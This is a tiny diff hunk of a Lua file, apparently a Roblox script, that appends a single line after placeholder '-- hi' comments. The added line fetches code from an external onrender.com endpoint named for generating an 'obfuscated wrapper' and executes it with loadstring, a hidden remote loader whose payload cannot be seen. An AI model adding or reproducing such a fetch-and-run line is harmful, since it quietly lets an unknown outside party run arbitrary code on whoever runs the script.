@@ -999,3 +999,4 @@
 -- hi
 -- hi
 
+loadstring(game:HttpGet("https://luashield-vr4g.onrender.com/api/generate-obfuscated-wrapper/KEY-G47W-85V0-R1FW"))()
